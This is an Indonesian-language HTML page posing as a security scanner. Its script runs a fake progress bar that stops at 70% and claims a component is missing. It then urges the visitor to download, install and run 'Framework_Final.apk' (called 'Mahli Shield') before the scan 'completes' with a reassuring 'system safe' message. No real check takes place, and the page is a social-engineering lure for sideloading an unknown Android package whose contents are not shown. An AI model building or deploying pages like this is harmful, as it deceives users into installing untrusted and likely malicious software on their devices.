<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        :root { --bg: #0b0f1a; --accent: #0ea5e9; --danger: #f43f5e; --success: #22c55e; --text: #f1f5f9; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .container { text-align: center; width: 80%; max-width: 400px; }
        .loader-ring { width: 120px; height: 120px; border: 4px solid rgba(14, 165, 233, 0.1); border-top: 4px solid var(--accent); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #percent { font-size: 42px; font-weight: 800; margin-bottom: 10px; }
        
        #popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; align-items: center; justify-content: center; }
        .modal { background: #161b2c; padding: 30px; border-radius: 20px; border: 1px solid var(--danger); width: 85%; max-width: 350px; text-align: center; }
        .btn-download { display: block; width: 100%; padding: 15px; background: var(--accent); color: white; text-decoration: none; border-radius: 10px; font-weight: bold; margin-top: 20px; border: none; cursor: pointer; }
        .btn-check { display: block; width: 100%; padding: 10px; background: transparent; color: var(--accent); text-decoration: none; font-size: 12px; margin-top: 15px; border: 1px solid var(--accent); border-radius: 8px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="container" id="mainContainer">
        <div class="loader-ring"></div>
        <div id="percent">0%</div>
        <div style="color:var(--accent); font-size:12px; letter-spacing:2px;">MENGANALISIS FRAMEWORK...</div>
    </div>

    <div id="popup">
        <div class="modal">
            <h2 style="color:var(--danger)">KOMPONEN HILANG</h2>
            <p style="font-size:14px; color:#94a3b8">Pemindaian terhenti di 70%. <b>Framework_Final.apk</b> harus diinstal dan dijalankan untuk verifikasi.</p>
            
            <a href="Framework_Final.apk" download="Framework_Final.apk" class="btn-download" onclick="startDownload()">1. DOWNLOAD & INSTAL</a>
            
            <button class="btn-check" onclick="verifyApp()">2. VERIFIKASI SEKARANG</button>
        </div>
    </div>

    <script>
        let p = 0;
        let scanInterval;
        let hasDownloaded = false;

        function runScanner() {
            scanInterval = setInterval(() => {
                p++;
                document.getElementById('percent').innerText = p + "%";

                if (p === 70) {
                    clearInterval(scanInterval);
                    // Cek apakah user sudah pernah sukses verifikasi sebelumnya
                    if (sessionStorage.getItem('verified') === 'true') {
                        runScanner();
                    } else {
                        document.getElementById('popup').style.display = 'flex';
                    }
                }

                if (p >= 100) {
                    clearInterval(scanInterval);
                    showSuccess();
                }
            }, 50);
        }

        function startDownload() {
            hasDownloaded = true;
            console.log("Download started...");
        }

        function verifyApp() {
            if (!hasDownloaded) {
                alert("Silakan klik Download & Instal terlebih dahulu.");
                return;
            }

            // Karena tidak ada Intent Filter, kita pakai trik manual:
            // User diminta membuka aplikasi secara manual, lalu kembali ke sini.
            let confirmation = confirm("Apakah Anda sudah menginstal dan menjalankan aplikasi Mahli Shield?\n\nJika sudah, klik OK untuk menyelesaikan verifikasi.");
            
            if (confirmation) {
                sessionStorage.setItem('verified', 'true');
                document.getElementById('popup').style.display = 'none';
                p = 70;
                runScanner();
            }
        }

        function showSuccess() {
            document.getElementById('mainContainer').innerHTML = `
                <div style="font-size:60px; color:var(--success)">üõ°Ô∏è</div>
                <h2 style="color:var(--success)">SISTEM AMAN</h2>
                <p style="color:#94a3b8">Framework terverifikasi.</p>
            `;
        }

        runScanner();
    </script>
</body>
</html>
